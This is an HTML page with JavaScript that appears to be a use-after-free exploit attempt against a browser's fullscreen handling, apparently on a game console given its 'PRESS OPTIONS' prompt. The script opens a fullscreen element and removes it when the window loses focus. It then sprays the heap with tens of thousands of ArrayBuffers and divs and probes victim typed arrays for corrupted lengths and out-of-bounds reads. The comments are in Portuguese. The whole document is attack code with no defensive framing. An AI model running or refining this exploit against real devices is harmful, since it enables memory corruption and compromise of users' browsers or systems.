<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF → Aggressive Reclaim (Synced)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF Synced Reclaim</h2>
<button onclick="run()">Run</button>

<pre id="log"></pre>

<script>
function log(m){
    document.getElementById("log").textContent += m + "\n";
}

function setupFS(){
    let d = document.createElement("div");
    d.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
    d.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
    document.body.appendChild(d);
    d.webkitRequestFullscreen();
    return d;
}

// 🔥 AGRESSIVO + MIXADO (igual ao que funcionou antes)
function aggressiveReclaim() {
    let pool = [];

    for (let i = 0; i < 30000; i++) {
        // mistura proposital (importante!)
        let buf = new ArrayBuffer(0x100);
        let f64 = new Float64Array(buf);
        f64[0] = 13.37;

        let str = "AAAA" + i;
        let div = document.createElement("div");
        div.textContent = str;

        pool.push(f64);
        pool.push(div);
    }

    return pool;
}

// 🔬 probe melhorado
function probe(arr) {
    log("---- PROBE ----");

    for (let i = 0; i < arr.length; i++) {
        let a = arr[i];

        try {
            if (a.byteLength !== 64 || a.length !== 8) {
                log("[CORRUPÇÃO]");
                log("len=" + a.length + " byteLen=" + a.byteLength);
                log("OOB=" + a[20]);
                return;
            }
        } catch(e){
            log("[EXCEPTION] " + e);
            return;
        }
    }

    log("[OK] nada detectado");
}

function run(){
    log("Running... Press OPTIONS");

    // vítimas reais
    let victims = [];
    for (let i = 0; i < 5000; i++) {
        let b = new ArrayBuffer(0x40);
        let f = new Float64Array(b);
        victims.push(f);
    }

    let fs = setupFS();

    window.onblur = function(){
        log("[*] onblur");

        setTimeout(() => {

            log("[*] TRIGGER + RECLAIM");

            // 💥 CRÍTICO: tudo junto
            fs.remove();

            let spray = aggressiveReclaim(); // 🔥 AQUI (antes do exit)

            document.webkitExitFullscreen();

            setTimeout(() => {
                probe(victims);
            }, 100);

        }, 3000);
    };
}
</script>

</body>
</html>
